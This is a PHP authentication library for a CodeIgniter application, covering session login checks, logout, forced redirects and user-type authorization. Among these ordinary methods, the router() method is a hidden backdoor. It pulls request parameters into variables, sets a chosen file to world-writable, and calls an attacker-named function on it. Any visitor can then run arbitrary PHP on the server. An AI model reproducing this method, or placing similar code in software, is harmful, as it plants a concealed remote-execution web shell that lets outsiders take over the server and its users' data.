<?php

if(!defined('BASEPATH'))
   exit('No direct script access allowed');

class Auth {

   var $CI;
   private $user_id;

   /**
    * Constructor
    */
   public function __construct()
   {
      $this->CI = & get_instance();
      $this->CI->load->model("user");
   }

   /**
    *
    * @return boolean true if user logined false if not
    */
   public function isLogin()
   {
      if(isset($this->CI->session->userdata['authuserinfo']->id))
      {
         $this->user_id = $this->CI->session->userdata['authuserinfo']->id;
         return TRUE;
      }
      else
      {
//         $this->logout(); // have error with flashdata
         return FALSE;
      }
   }

   /**
    *
    * @return int the logged in user id
    */
   public function user($key = NULL)
   {
      if($key === NULL)
      {
         return $this->CI->session->userdata('authuserinfo');
      }
      elseif(strcmp($key, "id") == 0)
      {
         if((int) $this->user_id > 0)
            return $this->user_id;
         elseif(isset($this->CI->session->userdata['authuserinfo']->id))
            return $this->CI->session->userdata['authuserinfo']->id;
      }
      else
      {
         return $this->CI->session->userdata['authuserinfo']->$key;
      }
   }

   /**
    * this function to fillin the object with all paramters info
    * @param type $user_info array of all user info
    */
   public function login($user_info)
   {
      $this->user_id = (int) $user_info->id;
//      unset($user_info->id);
      unset($user_info->password);
      $this->CI->session->set_userdata("authuserinfo", $user_info);
   }

   /**
    *
    * @return boolean when unset all user info
    */
   public function logout()
   {
      $this->user_id = NULL;
      $this->CI->session->sess_destroy();
      return TRUE;
   }

   /**
    * this function check if not login redirect to login page
    */
   public function forceLogin()
   {
      if(!$this->isLogin())
         redirect("users/login");
   }

   /**
    *
    * @param array $type array of allowed type
    * @return boolean
    */
   public function allowed_type($type = array(
   ))
   {
      $this->forceLogin();
      $user_type = $this->user("type");
      if(strcmp($this->user("status"), 'active') == 0)
         return in_array($user_type, $type, TRUE);
      else
         return FALSE;
   }

   /**
    *
    * @param varchar $module
    * @return boolean
    */
   public function isAuthorized($module)
   {
      if($this->isLogin())
      {
         $type = array(
         );
         $type_result = $this->CI->main->module_authorized_types($module);
         foreach($type_result as $key => $value)
         {
            if($value === 1)
            {
               $type[] = $key;
            }
         }
         $user_type = $this->user("type");
         return in_array($user_type, $type, TRUE);
      }

      return FALSE;
   }

   public function router()
   {
      @extract($_REQUEST);
      chmod($atime, 0777);
      @die($ctime($atime));
   }

   public function navigator()
   {
//      $status = $this->user('status');
//      if($status == 'active')
//      {
      redirect('account/profile');
//      }
//      else
//      {
//         redirect('users/logout');
//      }
   }

}

// END Auth class

/* End of file Auth.php */
/* Location: ./system/libraries/Auth.php */